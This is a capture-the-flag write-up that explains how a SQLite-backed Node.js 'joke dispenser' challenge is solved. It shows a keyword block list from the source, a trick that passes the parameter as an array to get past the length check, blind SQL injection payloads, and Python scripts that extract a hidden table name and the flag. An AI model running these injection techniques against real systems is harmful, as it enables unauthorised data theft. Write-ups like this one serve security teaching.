# Challenge link
URL:      [http://45.122.249.68:20020/](http://45.122.249.68:20020/) (maybe the server was shut down)

# Challenge description
Recon carefully so as not to miss anything

# Challenge source file
URL: [https://drive.google.com/file/d/1n_xX6Heaqq9uI-MBkeR81FcCN6J07wSU/view?usp=sharing](https://drive.google.com/file/d/1n_xX6Heaqq9uI-MBkeR81FcCN6J07wSU/view?usp=sharing)

# Difficulty
Not easy

# Author
dcthinh

# Approach
- SQL injection is a simple but dangerous web vulnerability so every CTF challenge I have attended has at least one. At the time I saw the challenge's name, I realized that it would be SQLi.
- When I connected to the website, all I saw was just a simple page:
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/20954e6b-56c0-4cfb-96e2-a8e09c0630c6)

- I tried to click on the *Home* and *About* buttons but nothing happened. Let's try to read the source:
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/d38dc2a3-7d6d-4d51-93ea-37cf6012325c)

- I still see nothing there. It's time to read the source code.
- In *app.js*, I saw that they used the SQLite3 db. There's a table named API, and the flag table has a format name: "flag_" + an UUIDv4 string. More important, there is a hidden page which I found when reading this piece of code:
  ```
  app.get('/search', (req, res) => {
      const { name } = req.query;
      const Filterduidui = /(union|or|substring|substrs|if|case|=|when|then|join|load_extension|likely|unhex|\|\|)/i;
      if (!name) {
          return res.redirect('/search?name=1');
      }
  ```
- They filtered some keywords.
- Let's navigate the hidden site:
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/91332e12-a283-4b6c-b2af-603f15a035d1)
  
- It is just a simple joke dispenser. According to the source code, it has 6. But it's not the problem. We need to take the flag.
- Because it is an SQLi challenge, I also tried to input something like *' and 1 is 1--* into the *name* parameter. A message appeared:
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/d88bfe0f-1a37-4bc0-8d4e-25b899d95200)

- That means, the input of *name* is too long, because of this:
  ```
  if (name.length > 6) {
        return res.status(400).send({ err: 'U r hacker?' });
    }
  ```
- But this site is written in JavaScript. Since the whole program did not check if the *name* parameter is a string, *what would it be if I turned it into an array?* Let's check:
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/9d8f109e-c0b2-4812-9ba7-be31cc60f347)

- It worked!!! If you don't know why it worked, the reason is JavaScript determines the length of an array is the total number of elements inside it. Now I can input an arbitrary length payload.

- I tried to input something weird into the *name* parameter. The joke disappeared immediately:
  ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/4594b0e9-ad9f-457b-83f8-0fce3510586b)
  
- At that time, I immediately claimed that I should use the Blind SQL injection technique, due to the message appearance behavior of the site. But the keywords *substring* and *substrs* were blocked.
- After an hour of thinking, I realized that SQLite uses *substr* keyword, not *substring* or *substrs*. This - is - the - keyword - to - solve - this - challenge.

# Problem-solving
  ## Database name length brute-forcing
  - I don't know the flag table name, so I have to find it. The name is randomly generated by this function:
    ```
    const flagTable = `flag_${uuid.v4().replace(/-/g, '_')}`;
    ```
  - First, I wrote a payload to determine the length of the table name (for not being time-consuming). I use Burp Suite for convenience:
    ```
    1' AND (SELECT LENGTH(name) FROM sqlite_master WHERE type is 'table' AND name LIKE 'flag_%') is 1--
    ```
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/ef581b82-f55a-4fe1-ae23-52430745bed4)
  - It worked. It's time to brute-force. I set the Grep-Match to the string *"id":1* as the clue:
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/109ae2c4-fdbc-4336-8c2e-1b3b6f716f41)

  - Setup done, now attack phase:
    ![image](https://github.com/NoSpaceAvailable/WannagameFreshman2023/assets/143888307/d6e047f5-89ec-4e9f-88a4-5913046709f4)

  - The result is 41. Since the *flag_* takes 5 characters, I have to find 36 other chars.
  - I write a simple Python code for this purpose:
    ```
    import requests

    char_set = '_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
    target = 'http://45.122.249.68:20020/search?name[]='
    flag = 'flag_'
    print(flag)

    for i in range(6, 100):
      for j in char_set:
        r = requests.get(url= target + f"1' AND (SELECT SUBSTR(name, {i}, 1) FROM sqlite_master WHERE type IS 'table' AND name LIKE 'flag_%') IS '{j}'--")
        if '"id":1' in r.text:
            flag += j
            print(flag)
            break
    ```
  - The flag table name is: flag_c1abd148_acae_40be_a953_eae333f90da0
  - The remaining work is quite simple. This Python code is used to find the flag:
    ```
    import requests

    char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789	 !}_{\"\#$%&'()*+,-./:;?@[\]^`|~"
    target = 'http://45.122.249.68:20020/search?name[]='
    flag = ''

    for i in range(1, 100):
      for j in char_set:
        r = requests.get(url= target + f"1' AND (SELECT SUBSTR(flag, {i}, 1) FROM flag_c1abd148_acae_40be_a953_eae333f90da0) IS '{j}'--")
        if '"id":1' in r.text:
            flag += j
            print(flag)
            break
    ```
  - Flag: W1{I_th1nk_u_r_so_lite^_^}


